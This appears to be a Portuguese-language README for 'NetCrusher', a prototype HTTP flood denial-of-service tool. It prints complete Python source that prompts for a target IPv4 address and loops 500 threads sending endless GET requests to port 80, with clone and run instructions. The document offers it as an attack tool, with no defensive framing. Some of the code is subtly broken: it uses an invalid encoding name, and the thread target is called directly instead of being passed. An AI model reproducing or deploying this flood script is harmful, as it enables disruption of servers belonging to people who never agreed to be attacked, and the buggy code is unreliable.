# Net-crusher

### Introdução 

- NetCrusher é um código de ataque Dos simples, sendo utilizado como base para uma ferramenta que negará Serviço na Camada de Aplicação. Esse Código realiza um ataque de Flood HTTP,
um tipo de ataque de negação de serviço (DoS), enviando um grande número de solicitações HTTP GET para um servidor alvo.

- Vale ressaltar que isso é um protótipo. Ele será a base da base pro que será a ferramenta final.

### Código 
<div style="display: inline_block"><br>
   <img align="center" alt="foto-teste" src="https://media.discordapp.net/attachments/1216774284471570473/1240432389948444794/image.png?ex=66468a2f&is=664538af&hm=34c7eab336f50442ef581240a3d67d6bfc93185067781cd424e8d93164530978&=&format=webp&quality=lossless"
</div> 

  >Imagem do código na shell

### Explicação
  * Este código em Python parece ser uma implementação de um ataque de negação de serviço (DoS) do tipo HTTP flood. Vou explicar cada parte do código:
Importações:

```python
      import socket
      import threading
```



- Estas bibliotecas são importadas para permitir o uso de sockets (conexões de rede) e threading (execução de múltiplas threads simultaneamente).
Entrada do usuário:

```python
      target = str(input("entre com o iPv4: "))
      port = 80
```

- Aqui, o código solicita ao usuário que insira o endereço IPv4 do alvo. A porta é definida como 80, que é a porta padrão para tráfego HTTP.

- Função
 
```python
      http_flood:
      def http_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1 \r\n").encode('ascii,'), (target,port))
        s.sendto(("Host: 192.168.56.2" +"\r\n\r\n").encode('ascii'), (target,port))
        print("Mandando Solicitação")
```

- Esta função é responsável por criar uma conexão TCP com o servidor de destino na porta 80 e enviar repetidamente uma solicitação HTTP GET. A função está em um loop infinito (while True), o que significa que continuará enviando solicitações até que o programa seja interrompido.

```python
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Cria um socket TCP.
    s.connect((target, port)) #Conecta ao alvo na porta especificada.
    s.sendto(("GET / HTTP/1.1 \r\n").encode('ascii,'), (target, port)) #Envia uma solicitação HTTP GET.
    s.sendto(("Host: 192.168.56.2" + "\r\n\r\n").encode('ascii'), (target, port)) #Envia o cabeçalho Host.
    print("Mandando Solicitação") #Imprime uma mensagem indicando que a solicitação foi enviada.
```


- Criação e inicialização das threads:

```python
  for i in range(500):
  thread = threading.Thread(target=http_flood())
  thread.start()
  Aqui, o código cria 500 threads, cada uma executando a função http_flood.

```





### instalação: 

      git clone https://github.com/molinaticas/DOS-simples.git
``` python
import socket
import threading

target = str(input("entre com o iPv4: "))
port = 80

def http_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1 \r\n").encode('ascii,'), (target, port))
        s.sendto(("Host: 192.168.56.2" + "\r\n\r\n").encode('ascii'), (target, port))
        print("Mandando Solicitação")


for i in range(500):
    thread = threading.Thread(target=http_flood())
    thread.start()
```

### COMO USAR:
  * python3 NetCrusher

### DEMONSTRAÇÃO: 

<div style="display: inline_block"><br>
  <img align="center" alt="gif" src="https://cdn.discordapp.com/attachments/1141095761069752330/1240441549414993961/Video_sem_titulo.gif?ex=664692b7&is=66454137&hm=10154f0bd484bc5a1fa1c2cff432144ae1f3253edabce67f9e651bff61460b63&"
</div> 

  >GIF do ataque
